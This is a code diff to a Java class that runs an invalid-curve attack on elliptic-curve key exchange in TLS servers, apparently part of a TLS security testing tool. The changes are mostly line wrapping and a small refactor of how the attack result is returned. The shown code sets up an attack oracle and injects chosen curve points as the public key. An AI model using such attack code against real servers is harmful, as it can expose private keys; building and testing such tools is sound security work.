@@ -61,12 +61,13 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
     @Override
     public void executeAttack() {
         Config tlsConfig = getTlsConfig();
-        LOGGER.info("Executing attack against the server with named curve {}", tlsConfig.getDefaultSelectedNamedGroup().name());
+        LOGGER.info("Executing attack against the server with named curve {}", tlsConfig.getDefaultSelectedNamedGroup()
+                .name());
         EllipticCurve curve = CurveFactory.getCurve(tlsConfig.getDefaultSelectedNamedGroup());
         RealDirectMessageECOracle oracle = new RealDirectMessageECOracle(tlsConfig, curve);
-        ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations());
-        attacker.attack();
-        BigInteger result = attacker.getResult();
+        ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations(),
+                tlsConfig.getDefaultSelectedNamedGroup());
+        BigInteger result = attacker.attack();
         LOGGER.info("Result found: {}", result);
     }
 
@@ -82,7 +83,8 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
             return null;
         }
         EllipticCurve curve = CurveFactory.getCurve(config.getNamedGroup());
-        Point point = Point.createPoint(config.getPublicPointBaseX(), config.getPublicPointBaseY(), config.getNamedGroup());
+        Point point = Point.createPoint(config.getPublicPointBaseX(), config.getPublicPointBaseY(),
+                config.getNamedGroup());
         for (int i = 0; i < getConfig().getProtocolFlows(); i++) {
             if (config.getPremasterSecret() != null) {
                 premasterSecret = config.getPremasterSecret();
@@ -130,7 +132,7 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         ModifiableByteArray serializedPublicKey = ModifiableVariableFactory.createByteArrayModifiableVariable();
         byte[] points = ArrayConverter.concatenate(ArrayConverter.bigIntegerToByteArray(config.getPublicPointBaseX()),
                 ArrayConverter.bigIntegerToByteArray(config.getPublicPointBaseY()));
-        byte[] serialized = ArrayConverter.concatenate(new byte[]{4}, points);
+        byte[] serialized = ArrayConverter.concatenate(new byte[] { 4 }, points);
         serializedPublicKey.setModification(ByteArrayModificationFactory.explicitValue(serialized));
         message.setPublicKey(serializedPublicKey);
         ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
